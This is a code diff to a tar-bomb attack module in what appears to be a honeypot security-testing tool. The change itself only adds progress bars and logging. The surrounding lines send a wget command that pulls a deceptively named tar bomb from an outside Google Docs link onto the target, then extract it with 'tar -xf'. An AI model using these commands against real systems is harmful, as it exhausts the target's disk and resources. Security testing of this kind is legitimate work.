@@ -1,6 +1,7 @@
 import asyncio
 import time
 
+from honeyscanner.progress import progress_manager
 from .base_attack import AttackResults, BaseAttack, BaseHoneypot
 from socket import socket
 """
@@ -44,9 +45,13 @@ class TarBomb(BaseAttack):
             cmd: str = f"wget 'https://docs.google.com/uc?export=download&id={self.tar_url_fileids[bomb_size]}' -O not_a_tar_bomb_{bomb_size}.tar\n"
             writer.write(cmd.encode())
             await writer.drain()
-            await asyncio.sleep(DOWNLOAD_SLEEP_TIME)
+            with progress_manager.task_progress(f"Downloading {bomb_size} tar bomb", total=DOWNLOAD_SLEEP_TIME) as task_id:
+                for _ in range(DOWNLOAD_SLEEP_TIME):
+                    await asyncio.sleep(1)
+                    if task_id is not None:
+                        progress_manager.update_task(task_id, advance=1)
         except Exception as e:
-            print(f"Error while downloading tar bomb: {e}")
+            progress_manager.log(f"Error while downloading tar bomb: {e}")
 
     async def extract_bomb_async(self, reader, writer, bomb_size: str) -> None:
         """
@@ -61,9 +66,14 @@ class TarBomb(BaseAttack):
             cmd: str = f'tar -xf not_a_tar_bomb_{bomb_size}.tar\n'
             writer.write(cmd.encode())
             await writer.drain()
-            await asyncio.sleep(EXTRACT_SLEEP_TIME[bomb_size])
+            extract_time = EXTRACT_SLEEP_TIME[bomb_size]
+            with progress_manager.task_progress(f"Extracting {bomb_size} tar bomb", total=extract_time) as task_id:
+                for _ in range(extract_time):
+                    await asyncio.sleep(1)
+                    if task_id is not None:
+                        progress_manager.update_task(task_id, advance=1)
         except Exception as e:
-            print(f"Error while extracting tar bomb: {e}")
+            progress_manager.log(f"Error while extracting tar bomb: {e}")
 
     async def create_async_connection(self) -> tuple[asyncio.StreamReader, asyncio.StreamWriter] | None:
         """
